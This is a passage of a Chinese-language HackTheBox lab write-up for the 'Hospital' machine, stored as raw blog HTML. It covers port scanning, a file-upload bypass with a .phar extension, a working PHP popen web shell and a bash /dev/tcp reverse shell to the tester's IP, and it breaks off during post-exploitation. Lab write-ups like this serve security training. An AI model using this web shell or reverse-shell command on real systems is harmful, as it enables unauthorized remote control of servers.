<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Machine - Hospital

 https://app.hackthebox.com/machines/Hospital | `Windows` | `Medium`
 



Recon

使用`nmap`进行扫描





看结果是有两个`Web`服务

匿名账户 `SMB` 无果



Web 渗透

信息收集

现在要决定哪个先作为目标，443端口是 `RoundCube`


..." data-next-head=""/><meta property="og:title" content="HackTheBox - Machine - Hospital" data-next-head=""/><meta property="og:description" content="Machine - Hospital

 https://app.hackthebox.com/machines/Hospital | `Windows` | `Medium`
 



Recon

使用`nmap`进行扫描





看结果是有两个`Web`服务

匿名账户 `SMB` 无果



Web 渗透

信息收集

现在要决定哪个先作为目标，443端口是 `RoundCube`


..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/06/04/HackTheBoxMachine - Hospital" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-06-04" data-next-head=""/><meta property="article:modified_time" content="2025-06-04" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="HackTheBox" data-next-head=""/><meta property="article:tag" content="Windows" data-next-head=""/><meta property="article:tag" content="Linux" data-next-head=""/><meta property="article:tag" content="FileUpload" data-next-head=""/><meta property="article:tag" content="Lay" data-next-head=""/><meta property="article:tag" content="CVE-2024-35250" data-next-head=""/><meta property="article:tag" content="RDP" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackTheBox - Machine - Hospital" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/06/04/HackTheBoxMachine - Hospital" data-next-head=""/><title data-next-head="">HackTheBox - Machine - Hospital</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-19a80ecec622553d.js" defer=""></script><script src="/_next/static/2X_PbQDqe6nbwHyn7V2gC/_buildManifest.js" defer=""></script><script src="/_next/static/2X_PbQDqe6nbwHyn7V2gC/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">HackTheBox - Machine - Hospital</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-06-04</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-06-04<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">HackTheBox</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Windows</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Linux</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">FileUpload</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Lay</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">CVE-2024-35250</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">RDP</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxMachine - Hospital","contentHtml":"\u003ch1\u003eMachine - Hospital\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Hospital\"\u003ehttps://app.hackthebox.com/machines/Hospital\u003c/a\u003e | \u003ccode\u003eWindows\u003c/code\u003e | \u003ccode\u003eMedium\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003cp\u003e使用\u003ccode\u003enmap\u003c/code\u003e进行扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital nmap -sT -min-rate 5000 10.10.11.241\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 21:19 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.241\nHost is up (0.054s latency).\nNot shown: 979 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n1801/tcp open  msmq\n2103/tcp open  zephyr-clt\n2105/tcp open  eklogin\n2107/tcp open  msmq-mgmt\n2179/tcp open  vmrdp\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5985/tcp open  wsman\n8080/tcp open  http-proxy\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 0.75 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital nmap -sT -A -p 22,53,88,135,139,389,636,445,443,8080,2105 10.10.11.241\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)\n|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-06-03 19:59:02Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n443/tcp  open  ssl/http      Apache httpd 2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28)\n|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28\n| tls-alpn:\n|_  http/1.1\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\n|_http-title: Hospital Webmail :: Welcome to Hospital Webmail\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n445/tcp  open  microsoft-ds?\nPORT    STATE SERVICE  VERSION\n389/tcp open  ldap     Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n636/tcp open  ldapssl?\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n2105/tcp open  msrpc         Microsoft Windows RPC\n8080/tcp open  http          Apache httpd 2.4.55 ((Ubuntu))\n|_http-server-header: Apache/2.4.55 (Ubuntu)\n| http-title: Login\n|_Requested resource was login.php\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e\n|_http-open-proxy: Proxy might be redirecting requests\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (91%)\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3\nAggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.13 (85%), Linux 3.10 - 4.11 (85%), Linux 3.2 - 4.14 (85%), Linux 4.15 (85%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-06-03T19:59:59\n|_  start_date: N/A\n|_clock-skew: 6h38m32s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   87.53 ms 10.10.16.1\n2   87.92 ms 10.10.11.241\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 103.35 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看结果是有两个\u003ccode\u003eWeb\u003c/code\u003e服务\u003c/p\u003e\n\u003cp\u003e匿名账户 \u003ccode\u003eSMB\u003c/code\u003e 无果\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital smbclient -L 10.10.11.241 -U anonymous\nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e现在要决定哪个先作为目标，443端口是 \u003ccode\u003eRoundCube\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e8080\u003c/code\u003e 端口像是自己写的一个医疗系统\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是可以注册账户\u003c/p\u003e\n\u003cp\u003e注册后登录进去，有一个文件上传功能点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e文件上传测试\u003c/h3\u003e\n\u003cp\u003e对上传功能点进行\u003ccode\u003eFuzz\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e通过修改后缀名成功上传 \u003ccode\u003ephar\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过目录扫描扫描一下是否找到上传后的文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital dirsearch -u http://10.10.11.241:8080/ -e php,txt,zip -x 403,404,503\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/HackTheBox/Hospital/reports/http_10.10.11.241_8080/__25-06-03_21-40-13.txt\n\nTarget: http://10.10.11.241:8080/\n\n[21:40:13] Starting: \n[21:40:36] 200 -    0B  - /config.php\n[21:40:37] 301 -  317B  - /css  -\u003e  http://10.10.11.241:8080/css/\n[21:40:42] 301 -  319B  - /fonts  -\u003e  http://10.10.11.241:8080/fonts/\n[21:40:44] 301 -  320B  - /images  -\u003e  http://10.10.11.241:8080/images/\n[21:40:46] 301 -  316B  - /js  -\u003e  http://10.10.11.241:8080/js/\n[21:40:48] 200 -    2KB - /login.php\n[21:40:58] 200 -    2KB - /register.php\n[21:41:07] 200 -    0B  - /upload.php\n[21:41:08] 301 -  321B  - /uploads  -\u003e  http://10.10.11.241:8080/uploads/\n\nTask Completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试访问上传的文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功！！我们接着换成一句话木马 hah\u003c/p\u003e\n\u003cp\u003e上传后发现无法执行，原来是被禁用了，他们将很多的命令执行的函数都\u003ccode\u003eban\u003c/code\u003e掉了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是发现一些伪协议没有被\u003ccode\u003eban\u003c/code\u003e掉\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试进行文件读取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php include(\u003cspan class=\"hljs-string\"\u003e'php://filter/convert.base64-encode/resource=c:/WINDOWS/system.ini'\u003c/span\u003e);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果也是一样读取不到\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试爆破一下未被禁用的命令执行函数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,shell_exec,\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e,proc_open,preg_replace,passthru,curl_exec\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们发现\u003ccode\u003epopen\u003c/code\u003e并没有被禁用，我们上传 \u003ccode\u003epopen\u003c/code\u003e的一句话木马\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (isset(\u003cspan class=\"hljs-variable\"\u003e$_REQUEST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'win_cmd'\u003c/span\u003e])) {\n    \u003cspan class=\"hljs-variable\"\u003e$command_to_execute\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$_REQUEST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'win_cmd'\u003c/span\u003e];\n    \u003cspan class=\"hljs-variable\"\u003e$handle\u003c/span\u003e = popen(\u003cspan class=\"hljs-variable\"\u003e$command_to_execute\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e' 2\u003e\u0026#x26;1'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'r'\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$handle\u003c/span\u003e) {\n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;pre\u003e\"\u003c/span\u003e;\n        \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ((\u003cspan class=\"hljs-variable\"\u003e$line\u003c/span\u003e = fgets(\u003cspan class=\"hljs-variable\"\u003e$handle\u003c/span\u003e)) !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n            \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e htmlspecialchars(\u003cspan class=\"hljs-variable\"\u003e$line\u003c/span\u003e);\n        }\n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;/pre\u003e\"\u003c/span\u003e;\n        \u003cspan class=\"hljs-variable\"\u003e$exit_status\u003c/span\u003e = pclose(\u003cspan class=\"hljs-variable\"\u003e$handle\u003c/span\u003e);\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"无法执行命令或打开管道。\"\u003c/span\u003e;\n    }\n} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"请提供 'win_cmd' 参数来执行命令。\"\u003c/span\u003e;\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功执行命令\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e反弹 shell\u003c/h3\u003e\n\u003cp\u003e这里我看靶机信息是\u003ccode\u003eWindows\u003c/code\u003e，然后尝试了很多的\u003ccode\u003eWindows\u003c/code\u003e反弹\u003ccode\u003eshell\u003c/code\u003e的命令，直到我发现回显\u003ccode\u003epowershell\u003c/code\u003e不存在，然后我读取了一下 \u003ccode\u003e/etc/passwd\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e所以这里应该是一个容器\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/NOOOO-3x.gif\" alt=\"NOOOO-3x.gif\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/bin/bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/10.10.16.69/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eIn Www-data Shell\u003c/h2\u003e\n\u003ch3\u003eBasic info\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@webserver:/var$ ip add\n1: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 00:15:5d:00:8a:02 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.5.2/24 brd 192.168.5.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::215:5dff:fe00:8a02/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \n       valid_lft forever preferred_lft 